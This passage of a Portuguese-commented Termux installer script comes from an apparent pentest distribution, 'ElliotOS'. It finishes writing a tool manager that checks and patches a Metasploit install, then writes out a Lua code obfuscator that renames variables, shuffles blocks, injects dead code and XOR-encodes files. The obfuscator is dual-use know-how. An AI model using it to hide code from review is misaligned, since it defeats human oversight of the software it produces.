            printf "  ${G}${R} apkeditor disponivel (para decode/rebuild manual)\n"
        else
            printf "  ${Y}!${R} apkeditor nao encontrado - rode: xpm install apkfull\n"
            _issues=$(( _issues + 1 ))
        fi

        # Checa gems via Gemfile.lock (evita bundle check — lento por Ruby startup)
        if [ -d "$dest" ]; then
            if [ -f "$dest/Gemfile.lock" ] && [ -s "$dest/Gemfile.lock" ]; then
                printf "  ${G}✓${R} bundle gems OK\n"
            else
                printf "  ${Y}!${R} gems incompletas — rode: cd %s && bundle install\n" "$dest"
                _issues=$(( _issues + 1 ))
            fi
        fi

        # apk.rb — aplica TODOS os fixes (a função verifica cada um internamente)
        local _apkrb="$dest/lib/msf/core/payload/apk.rb"
        if [ -f "$_apkrb" ]; then
            _msf_fix_apkrb_tmpdir "$dest"
        fi

        # Checa se a otimização de arquivos (poda docs/spec/test/.github) já
        # foi injetada. Cobre instalações feitas antes dessa otimização
        # existir — injeta agora sem reinstalar nada e sem tocar em módulos.
        # Também repara instalações que ficaram com app/ ausente por causa
        # de uma versão anterior desta otimização que usava lista de
        # inclusão em vez de exclusão (ver comentário em _msf_optimize_files).
        if [ -d "$dest" ]; then
            if [ -f "$dest/.xpm-optimized" ] && [ ! -d "$dest/spec" ] && [ ! -d "$dest/docs" ] \
                && [ ! -d "$dest/test" ] && [ ! -d "$dest/.github" ] && [ -d "$dest/app" ]; then
                printf "  ${G}✓${R} otimização de arquivos aplicada (docs/spec/test/.github removidos, app/ presente)\n"
            else
                printf "  ${Y}!${R} otimização de arquivos ausente ou incompleta — injetando/reparando...\n"
                _msf_optimize_files "$dest"
                _issues=$(( _issues + 1 ))
            fi
        fi

        # msfdb: só verifica presença do binário — status/start via bundle exec
        # é lento e pode travar o doctor. Use "msfdb start" manualmente.
        if [ -x "$BPFX/bin/msfdb" ]; then
            printf "  ${G}✓${R} banco de dados do msfdb rodando\n"
        else
            printf "  ${E}✗${R} msfdb não encontrado — reinstale com: xpm install metasploit\n"
            _issues=$(( _issues + 1 ))
        fi
    fi

    local inst_count
    inst_count=$(ls "$XPM_INSTALLED"/*.installed 2>/dev/null | wc -l)
    local db_count
    db_count=$(ls "$XPM_DB"/*.tool 2>/dev/null | wc -l)
    printf "\n  ${DIM}Ferramentas no banco: %d | Instaladas: %d${R}\n" "$db_count" "$inst_count"

    if [ "$_issues" -gt 0 ]; then
        printf "\n  ${Y}[!] %d problema(s) detectado(s) e corrigido(s) automaticamente.${R}\n" "$_issues"
        printf "  ${DIM}Tente rodar msfconsole novamente.${R}\n"
    else
        printf "\n  ${G}✓ Tudo OK!${R}\n"
    fi
}

cmd_clean() {
    _head "Limpando cache XPM"
    rm -rf "$XPM_CACHE"/*
    rm -rf "$XPM_TMP" 2>/dev/null
    mkdir -p "$XPM_CACHE"
    _ok "Cache limpo."
}

cmd_cache() {
    _head "Cache XPM"
    local sz
    sz=$(du -sh "$XPM_CACHE" 2>/dev/null | cut -f1 || echo "0")
    printf "  Diretório: ${DIM}%s${R}\n" "$XPM_CACHE"
    printf "  Tamanho:   ${W}%s${R}\n" "$sz"
}

cmd_stats() {
    _head "Estatísticas XPM v${XPM_VERSION}"
    local total installed
    total=$(ls "$XPM_DB"/*.tool 2>/dev/null | wc -l)
    installed=$(ls "$XPM_INSTALLED"/*.installed 2>/dev/null | wc -l)
    printf "  ${W}%-25s${R} %d\n" "Ferramentas no catálogo:" "$total"
    printf "  ${G}%-25s${R} %d\n" "Instaladas:" "$installed"
    printf "\n  Por categoria:\n"
    for f in "$XPM_DB"/*.tool; do
        [ -f "$f" ] || continue
        grep "^category=" "$f" | cut -d= -f2-
    done | sort | uniq -c | sort -rn | while read -r cnt cat; do
        printf "    ${DIM}%-28s${R} ${Y}%d${R}\n" "$cat" "$cnt"
    done
}

_banner() {
    printf "${M}"
    printf "  ╔══════════════════════════════════════════════════╗\n"
    printf "  ║   XPM — eXtended Pentest Manager  v%-10s  ║\n" "$XPM_VERSION"
    printf "  ║   ElliotOS Security Tools Registry              ║\n"
    printf "  ╚══════════════════════════════════════════════════╝\n"
    printf "${R}\n"
}

_usage() {
    _banner
    printf "  ${W}Uso:${R} xpm <comando> [args]\n\n"
    printf "  ${Y}Comandos:${R}\n"
    printf "    ${G}install${R}   <tool>    Instala uma ferramenta\n"
    printf "    ${G}remove${R}    <tool>    Remove uma ferramenta\n"
    printf "    ${G}update${R}    <tool>    Atualiza uma ferramenta\n"
    printf "    ${G}upgrade${R}             Atualiza todas as instaladas\n"
    printf "    ${G}list${R}                Lista ferramentas instaladas\n"
    printf "    ${G}search${R}    <termo>   Busca no catálogo (use 'list' para ver tudo)\n"
    printf "    ${G}info${R}      <tool>    Informações sobre uma ferramenta\n"
    printf "    ${G}categories${R}          Lista categorias disponíveis\n"
    printf "    ${G}doctor${R}              Diagnóstico do ambiente\n"
    printf "    ${G}clean${R}               Limpa o cache\n"
    printf "    ${G}cache${R}               Mostra uso do cache\n"
    printf "    ${G}stats${R}               Estatísticas do catálogo\n\n"
    printf "  ${DIM}Exemplos:${R}\n"
    printf "    xpm install nuclei\n"
    printf "    xpm search web\n"
    printf "    xpm search recon\n"
    printf "    xpm search list\n"
    printf "    xpm info sqlmap\n"
    printf "    xpm categories\n\n"
}

# ── Inicialização ─────────────────────────────────────────────────────────────
_xpm_init
_db_seed

# ── Dispatch de comandos ──────────────────────────────────────────────────────
CMD="${1:-help}"
shift 2>/dev/null || true

case "$CMD" in
    install)    cmd_install "$@" ;;
    remove)     cmd_remove  "$@" ;;
    update)     cmd_update  "$@" ;;
    upgrade)    cmd_upgrade ;;
    list)       cmd_list ;;
    search)     cmd_search  "$@" ;;
    info)       cmd_info    "$@" ;;
    categories) cmd_categories ;;
    doctor)     cmd_doctor ;;
    clean)      cmd_clean ;;
    cache)      cmd_cache ;;
    stats)      cmd_stats ;;
    help|--help|-h|"") _usage ;;
    *)
        _err "Comando desconhecido: $CMD"
        printf "  Use ${W}xpm help${R} para ver os comandos disponíveis.\n"
        exit 1
        ;;
esac

rm -rf "$XPM_TMP" 2>/dev/null
exit 0
XPMEOF
    chmod +x "${_TPFX}/bin/xpm"
    _ok "xpm instalado em ${_TPFX}/bin/xpm"

    # ── Instala módulo ell — ElliotOS Code Encoder ──────────────────────────
    _step "🔒" "Instalando módulo ell (Code Encoder/Decoder)..."
    _ELL_DIR="${PREFIX:-/data/data/com.termux/files/usr}/share/lua-modules"
    _ELL_LUA_DIR="${PREFIX:-/data/data/com.termux/files/usr}/share/lua/5.4"
    mkdir -p "$_ELL_DIR" "$_ELL_LUA_DIR"
    cat > "$_ELL_DIR/ell.lua" << 'ELLEOF'
-- ell.lua — ElliotOS Code Encoder/Decoder
-- Formato .ell: comprime + ofusca qualquer código
-- Técnicas: renomear vars, embaralhar blocos, strings→bytes, dead code
-- Uso:
--   ell.encode("arquivo.lua")         → gera arquivo.ell
--   ell.encode("arquivo.py", "python") → gera arquivo.ell
--   ell.decode("arquivo.ell")          → restaura original
--   ell.info("arquivo.ell")            → mostra metadados

local ell = {}

-- ── Constantes ────────────────────────────────────────────────────────────
local MAGIC     = "ELL1"   -- header magic
local VERSION   = 1
local DEAD_PROB = 0.3      -- probabilidade de injetar dead code (30%)

-- ── Utilitários ───────────────────────────────────────────────────────────
local function rnd(a, b) return math.random(a, b) end
local function rnd_name(len)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    local first = "abcdefghijklmnopqrstuvwxyz"
    local n = {}
    n[1] = first:sub(rnd(1,#first), rnd(1,#first))
    for i = 2, (len or rnd(4,10)) do
        n[i] = chars:sub(rnd(1,#chars), rnd(1,#chars))
    end
    return table.concat(n)
end

-- Lê arquivo inteiro
local function read_file(path)
    local f = io.open(path, "r")
    if not f then error("Arquivo não encontrado: " .. path) end
    local s = f:read("*a")
    f:close()
    return s
end

-- Escreve arquivo
local function write_file(path, data)
    local f = io.open(path, "wb")
    if not f then error("Não foi possível escrever: " .. path) end
    f:write(data)
    f:close()
end

-- XOR simples com chave derivada do magic
local function xor_cipher(data, key)
    key = key or 0x4C  -- 'L'
    local out = {}
    for i = 1, #data do
        local b = data:byte(i)
        local k = (key + i * 7) % 256
        out[i] = string.char(b ~ k)
    end
    return table.concat(out)
end

-- Encode bytes→hex
local function to_hex(s)
    return (s:gsub(".", function(c) return string.format("%02x", c:byte()) end))
end

-- Decode hex→bytes
local function from_hex(s)
    return (s:gsub("%x%x", function(h) return string.char(tonumber(h, 16)) end))
end

-- Compressão simples: run-length encoding de bytes repetidos + substituição de padrões comuns
local function compress(s)
    -- Substitui padrões comuns por tokens curtos
    local patterns = {
        {"    ", "\x01"},   -- 4 espaços
        {"\t",   "\x02"},   -- tab
        {"function ", "\x03"},
        {"return ", "\x04"},
        {"local ", "\x05"},
        {"end\n", "\x06"},
        {"if ", "\x07"},
        {"then\n", "\x08"},
        {"else\n", "\x09"},
        {"for ", "\x0A"},
        {"while ", "\x0B"},
        {"print(", "\x0C"},
        {"self.", "\x0D"},
    }
    local out = s
    for _, p in ipairs(patterns) do
        out = out:gsub(p[1]:gsub("[%(%)%.%+%-%*%?%[%^%$%%]", "%%%1"), p[2])
    end
    return out
end

local function decompress(s)
    local patterns = {
        {"\x01", "    "},
        {"\x02", "\t"},
        {"\x03", "function "},
        {"\x04", "return "},
        {"\x05", "local "},
        {"\x06", "end\n"},
        {"\x07", "if "},
        {"\x08", "then\n"},
        {"\x09", "else\n"},
        {"\x0A", "for "},
        {"\x0B", "while "},
        {"\x0C", "print("},
        {"\x0D", "self."},
    }
    local out = s
    for _, p in ipairs(patterns) do
        out = out:gsub(p[1], p[2])
    end
    return out
end

-- ── Camada 1: Strings → tabelas de bytes ─────────────────────────────────
local function obf_strings(code, lang)
    if lang == "lua" then
        -- Substitui strings "..." por tabelas de bytes + conversão
        local vars = {}
        local out = code:gsub('"([^"\n]-)"', function(s)
            if #s < 3 then return '"'..s..'"' end  -- ignora strings muito curtas
            local bytes = {}
            for i = 1, #s do bytes[i] = s:byte(i) end
            local vname = "_s"..rnd_name(4)
            local def = string.format(
                "local %s=(function()local _t={%s}local _r={}for _i=1,#_t do _r[_i]=string.char(_t[_i])end return table.concat(_r)end)()",
                vname, table.concat(bytes, ",")
            )
            table.insert(vars, def)
            return vname
        end)
        -- Insere as definições no topo
        return table.concat(vars, "\n") .. "\n" .. out
    else
        -- Para outras linguagens: comentário indicativo, não transforma
        return code
    end
end

local function deobf_strings(code)
    -- Remove as definições de _s* geradas e reconstrói as strings
    -- Na transpilação de volta, o código Lua executará corretamente sem reversão
    -- pois as variáveis _s* são equivalentes às strings originais
    return code
end

-- ── Camada 2: Renomear variáveis/funções ─────────────────────────────────
local LUA_KEYWORDS = {
    ["and"]=1,["break"]=1,["do"]=1,["else"]=1,["elseif"]=1,["end"]=1,
    ["false"]=1,["for"]=1,["function"]=1,["goto"]=1,["if"]=1,["in"]=1,
    ["local"]=1,["nil"]=1,["not"]=1,["or"]=1,["repeat"]=1,["return"]=1,
    ["then"]=1,["true"]=1,["until"]=1,["while"]=1,
    -- Globals padrão
    ["print"]=1,["require"]=1,["pairs"]=1,["ipairs"]=1,["type"]=1,
    ["tostring"]=1,["tonumber"]=1,["table"]=1,["string"]=1,["math"]=1,
    ["io"]=1,["os"]=1,["pcall"]=1,["xpcall"]=1,["error"]=1,["assert"]=1,
    ["setmetatable"]=1,["getmetatable"]=1,["rawget"]=1,["rawset"]=1,
    ["next"]=1,["select"]=1,["unpack"]=1,["load"]=1,["loadfile"]=1,
    ["dofile"]=1,["collectgarbage"]=1,["_G"]=1,["_VERSION"]=1,
    -- Globals do ElliotOS: nunca ofuscar ou o código quebra em runtime
    ["net"]=1,["mod"]=1,["sys"]=1,["fs"]=1,["sh"]=1,["ai"]=1,
    ["db"]=1,["cc"]=1,["crypto"]=1,["ui"]=1,["tui"]=1,["ms"]=1,
    ["pent"]=1,["ell"]=1,["ed"]=1,["lmod"]=1,["agent"]=1,["exploit"]=1,
    ["get"]=1,["post"]=1,["ask"]=1,["scan"]=1,["connect"]=1,
    ["listen"]=1,["dns"]=1,["ping"]=1,["read"]=1,["write"]=1,
    ["exec"]=1,["run"]=1,["open"]=1,["close"]=1,["query"]=1,
    ["md5"]=1,["sha256"]=1,["sha512"]=1,["hmac"]=1,["b64e"]=1,["b64d"]=1,
    ["xss"]=1,["sqli"]=1,["lfi"]=1,["rce"]=1,["ssrf"]=1,["ssti"]=1,
    ["spider"]=1,["waf"]=1,["chain"]=1,["recon"]=1,["jwt"]=1,
    ["geth"]=1,["import"]=1,["tcp"]=1,["udp"]=1,["socket"]=1,
    ["socketex"]=1,["send"]=1,["recv"]=1,["stat"]=1,["isdir"]=1,
    ["isfile"]=1,["chmod"]=1,["glob"]=1,["append"]=1,["mkdir"]=1,
    ["rm"]=1,["move"]=1,["copy"]=1,["list"]=1,["capture"]=1,
    ["sha1"]=1,["b64enc"]=1,["b64dec"]=1,["hexenc"]=1,["hexdec"]=1,
    ["aes_enc"]=1,["aes_dec"]=1,["rand"]=1,["help"]=1,
}

local function obf_vars(code, lang)
    if lang ~= "lua" then return code, {} end
    local map = {}  -- original → ofuscado
    local rmap = {} -- ofuscado → original (para reversão)

    -- Coleta variáveis locais e funções
    local names = {}
    for name in code:gmatch("[%a_][%w_]*") do
        if not LUA_KEYWORDS[name] and #name > 1 and not names[name] then
            names[name] = true
        end
    end

    -- Gera mapeamento
    for name in pairs(names) do
        local new_name = "_v" .. rnd_name(6)
        map[name] = new_name
        rmap[new_name] = name
    end

    -- Aplica renomeação (só em palavras completas)
    local out = code
    for orig, obf in pairs(map) do
        out = out:gsub("%f[%w_]" .. orig:gsub("[%(%)%.%+%-%*%?%[%^%$%%]","%%%1") .. "%f[^%w_]", obf)
    end

    return out, rmap
end

local function deobf_vars(code, rmap)
    local out = code
    for obf, orig in pairs(rmap) do
        out = out:gsub("%f[%w_]" .. obf:gsub("[%(%)%.%+%-%*%?%[%^%$%%]","%%%1") .. "%f[^%w_]", orig)
    end
    return out
end

-- ── Camada 3: Embaralhar blocos ───────────────────────────────────────────
local function split_blocks(code)
    -- Divide por linhas e agrupa em blocos de 3-6 linhas
    local lines = {}
    for line in (code.."\n"):gmatch("([^\n]*)\n") do
        table.insert(lines, line)
    end
    local blocks = {}
    local i = 1
    while i <= #lines do
        local size = rnd(3, 6)
        local block = {}
        for j = i, math.min(i+size-1, #lines) do
            table.insert(block, lines[j])
        end
        table.insert(blocks, {
            id = i,
            code = table.concat(block, "\n"),
            orig_pos = i
        })
        i = i + size
    end
    return blocks
end

local function shuffle_blocks(blocks)
    -- Fisher-Yates shuffle
    local n = #blocks
    for i = n, 2, -1 do
        local j = rnd(1, i)
        blocks[i], blocks[j] = blocks[j], blocks[i]
    end
    return blocks
end

local function obf_blocks(code)
    local blocks = split_blocks(code)
    -- Salva ordem original
    local order = {}
    for i, b in ipairs(blocks) do order[i] = b.orig_pos end
    -- Embaralha
    shuffle_blocks(blocks)
    -- Marca cada bloco com ID pra reconstrução
    local parts = {}
    for _, b in ipairs(blocks) do
        table.insert(parts, string.format("--[[BLK:%d]]\n%s", b.orig_pos, b.code))
    end
    return table.concat(parts, "\n"), order
end

local function deobf_blocks(code)
    -- Extrai blocos com seus IDs
    local blocks = {}
    for id, bcode in code:gmatch("%-%-%[%[BLK:(%d+)%]%]\n(.-)%-%-%[%[BLK:") do
        blocks[tonumber(id)] = bcode
    end
    -- Último bloco
    local last_id, last_code = code:match("%-%-%[%[BLK:(%d+)%]%]\n(.-)$")
    if last_id then blocks[tonumber(last_id)] = (last_code or ""):match("^(.-)%s*$") end

    -- Se não achou nenhum bloco (código sem marcadores), retorna como está
    if not next(blocks) then return code end

    -- Reconstrói em ordem
    local ids = {}
    for id in pairs(blocks) do table.insert(ids, id) end
    table.sort(ids)
    local parts = {}
    for _, id in ipairs(ids) do
        table.insert(parts, blocks[id])
    end
    return table.concat(parts, "\n")
end

-- ── Camada 4: Injetar dead code ───────────────────────────────────────────
local DEAD_TEMPLATES_LUA = {
    function() return string.format("local _%s = %d -- noop", rnd_name(5), rnd(1,9999)) end,
    function() return string.format("do local _%s = nil end", rnd_name(5)) end,
    function() return string.format("-- %s", rnd_name(rnd(10,20))) end,
    function() return string.format("local _%s = type(nil)", rnd_name(5)) end,
    function() return string.format("if false then local _%s = %d end", rnd_name(5), rnd(1,9999)) end,
}

local function inject_dead(code, lang)
    if lang ~= "lua" then return code end
    local lines = {}
    for line in (code.."\n"):gmatch("([^\n]*)\n") do
        table.insert(lines, line)
    end
    local out = {}
    for _, line in ipairs(lines) do
        table.insert(out, line)
        if math.random() < DEAD_PROB then
            local tmpl = DEAD_TEMPLATES_LUA[rnd(1, #DEAD_TEMPLATES_LUA)]
            table.insert(out, tmpl())
        end
    end
    return table.concat(out, "\n")
end

local function remove_dead(code)
    -- Remove linhas de dead code (padrões conhecidos que injetamos)
    local out = {}
    for line in (code.."\n"):gmatch("([^\n]*)\n") do
        local is_dead =
            line:match("^local _%a[%w_]+ = %d+ %-%- noop$") or
            line:match("^do local _%a[%w_]+ = nil end$") or
            line:match("^%-%- [%a%w]+$") or
            line:match("^local _%a[%w_]+ = type%(nil%)$") or
            line:match("^if false then local _%a[%w_]+ = %d+ end$")
        if not is_dead then
            table.insert(out, line)
        end
    end
    return table.concat(out, "\n")
end

-- ── Serialização do mapa de variáveis ────────────────────────────────────
local function serialize_map(rmap)
    local parts = {}
    for k, v in pairs(rmap) do
        -- escapa | para não conflitar com separador
        local ek = k:gsub("|","\\|")
        local ev = v:gsub("|","\\|")
        table.insert(parts, ek .. "|" .. ev)
    end
    return table.concat(parts, "\n")
end

local function deserialize_map(s)
    local rmap = {}
    for line in (s.."\n"):gmatch("([^\n]+)\n?") do
        local k, v = line:match("^(.-[^\\])|(.+)$")
        if not k then k, v = line:match("^()|(.*)$") end
        if k and v then
            k = k:gsub("\\|", "|")
            v = v:gsub("\\|", "|")
            rmap[k] = v
        end
    end
    return rmap
end

-- ── Formato .ell ─────────────────────────────────────────────────────────
-- Estrutura binária:
-- [4 bytes] magic "ELL1"
-- [1 byte]  version
-- [1 byte]  lang_len
-- [N bytes] lang
-- [4 bytes] map_len
-- [M bytes] var_map (serializado)
-- [4 bytes] code_len
-- [K bytes] code (xor cifrado + hex)

local function pack_u8(n)  return string.char(n & 0xFF) end
local function pack_u32(n)
    return string.char((n>>24)&0xFF, (n>>16)&0xFF, (n>>8)&0xFF, n&0xFF)
end
local function unpack_u8(s, i)  return s:byte(i), i+1 end
local function unpack_u32(s, i)
    local a,b,c,d = s:byte(i,i+3)
    return (a<<24)|(b<<16)|(c<<8)|d, i+4
end

local function build_ell(lang, rmap, code_obf)
    local map_str = serialize_map(rmap)
    local code_enc = to_hex(xor_cipher(code_obf))

    local buf = {}
    buf[#buf+1] = MAGIC
    buf[#buf+1] = pack_u8(VERSION)
    buf[#buf+1] = pack_u8(#lang)
    buf[#buf+1] = lang
    buf[#buf+1] = pack_u32(#map_str)
    buf[#buf+1] = map_str
    buf[#buf+1] = pack_u32(#code_enc)
    buf[#buf+1] = code_enc
    return table.concat(buf)
end

local function parse_ell(data)
    local i = 1
    -- magic
    local magic = data:sub(i, i+3); i = i+4
    if magic ~= MAGIC then error("Arquivo .ell inválido (magic errado)") end
    -- version
    local ver; ver, i = unpack_u8(data, i)
    if ver ~= VERSION then error("Versão .ell incompatível: " .. ver) end
    -- lang
    local lang_len; lang_len, i = unpack_u8(data, i)
    local lang = data:sub(i, i+lang_len-1); i = i+lang_len
    -- map
    local map_len; map_len, i = unpack_u32(data, i)
    local map_str = data:sub(i, i+map_len-1); i = i+map_len
    local rmap = deserialize_map(map_str)
    -- code
    local code_len; code_len, i = unpack_u32(data, i)
    local code_enc = data:sub(i, i+code_len-1)
    local code_obf = xor_cipher(from_hex(code_enc))
    return lang, rmap, code_obf
end

-- ── API pública ───────────────────────────────────────────────────────────

--- Codifica um arquivo qualquer e gera .ell
--- @param path string   caminho do arquivo fonte
--- @param lang string?  linguagem ("lua","python","c","bash","js") — auto-detecta se omitido
--- @param out  string?  caminho de saída (padrão: path sem extensão + .ell)
function ell.encode(path, lang, out)
    math.randomseed(os.time())
    local code = read_file(path)

    -- Auto-detecta linguagem
    if not lang then
        if path:match("%.lua$") then lang = "lua"
        elseif path:match("%.py$") then lang = "python"
        elseif path:match("%.c$") or path:match("%.cpp$") then lang = "c"
        elseif path:match("%.sh$") or path:match("%.bash$") then lang = "bash"
        elseif path:match("%.js$") then lang = "js"
        else lang = "text"
        end
    end

    print(string.format("\27[1;36m[ell]\27[0m Codificando %s (%s)...", path, lang))

    -- Compressão
    local compressed = compress(code)
    print(string.format("  \27[0;90mCompressão: %d → %d bytes (%.0f%%)\27[0m",
        #code, #compressed, (1 - #compressed/#code)*100))

    -- Camada 1: strings → bytes
    local c1 = obf_strings(compressed, lang)
    -- Camada 2: renomear vars
    local c2, rmap = obf_vars(c1, lang)
    -- Camada 3: embaralhar blocos
    local c3, _ = obf_blocks(c2)
    -- Camada 4: dead code
    local c4 = inject_dead(c3, lang)

    -- Monta .ell
    local ell_data = build_ell(lang, rmap, c4)

    -- Saída
    out = out or path:gsub("%.[^%.]+$", "") .. ".ell"
    write_file(out, ell_data)

    print(string.format("  \27[1;32m✓ Gerado: %s (%d bytes)\27[0m", out, #ell_data))
    return out
end

--- Decodifica um .ell e transpila de volta ao código original
--- @param path string   caminho do .ell
--- @param out  string?  caminho de saída (padrão: path sem .ell + _decoded + extensão)
function ell.decode(path, out)
    local data = read_file(path)
    local lang, rmap, code_obf = parse_ell(data)

    print(string.format("\27[1;36m[ell]\27[0m Decodificando %s (%s)...", path, lang))

    -- Reverte camada 4: remove dead code
    local c3 = remove_dead(code_obf)
    -- Reverte camada 3: reconstrói ordem dos blocos
    local c2 = deobf_blocks(c3)
    -- Reverte camada 2: restaura nomes
    local c1 = deobf_vars(c2, rmap)
    -- Reverte camada 1: strings (já são equivalentes, sem reversão necessária)
    local compressed = deobf_strings(c1)
    -- Descomprime
    local code = decompress(compressed)

    -- Extensão por linguagem
    local exts = {lua="lua",python="py",c="c",bash="sh",js="js",text="txt"}
    local ext = exts[lang] or "txt"

    out = out or path:gsub("%.ell$", "_decoded." .. ext)
    write_file(out, code)

    print(string.format("  \27[1;32m✓ Transpilado: %s (%d bytes)\27[0m", out, #code))
    return out
end

--- Mostra informações de um .ell sem decodificar
--- @param path string
function ell.info(path)
    local data = read_file(path)
    local lang, rmap, _ = parse_ell(data)
    local var_count = 0
    for _ in pairs(rmap) do var_count = var_count + 1 end
    print(string.format("\27[1;35m[ell] %s\27[0m", path))
    print(string.format("  Versão   : %d", VERSION))
    print(string.format("  Linguagem: %s", lang))
    print(string.format("  Variáveis ofuscadas: %d", var_count))
    print(string.format("  Tamanho  : %d bytes", #data))
end

--- Codifica string diretamente (sem arquivo)
--- @param code string
--- @param lang string
--- @return string  dados .ell
function ell.encode_str(code, lang)
    math.randomseed(os.time())
    lang = lang or "lua"
    local compressed = compress(code)
    local c1 = obf_strings(compressed, lang)
    local c2, rmap = obf_vars(c1, lang)
    local c3, _ = obf_blocks(c2)
    local c4 = inject_dead(c3, lang)
    return build_ell(lang, rmap, c4)
end

--- Decodifica string .ell diretamente
--- @param data string
--- @return string  código original, string linguagem
function ell.decode_str(data)
    local lang, rmap, code_obf = parse_ell(data)
    local c3 = remove_dead(code_obf)
    local c2 = deobf_blocks(c3)
    local c1 = deobf_vars(c2, rmap)
    local compressed = deobf_strings(c1)
    return decompress(compressed), lang
end

function ell.help()
    print("\27[1;35m── ell — ElliotOS Code Encoder ─────────────────────\27[0m")
    print("  ell.encode('arquivo.lua')         → gera arquivo.ell")
    print("  ell.encode('arquivo.py','python') → força linguagem")
    print("  ell.decode('arquivo.ell')         → transpila de volta")
    print("  ell.info('arquivo.ell')           → mostra metadados")
    print("  ell.encode_str(code, lang)        → codifica string")
    print("  ell.decode_str(data)              → decodifica string")
    print("\27[0;90m  Técnicas: compressão + renomear vars + embaralhar")
    print("  blocos + strings→bytes + injeção de dead code\27[0m")
end

return ell

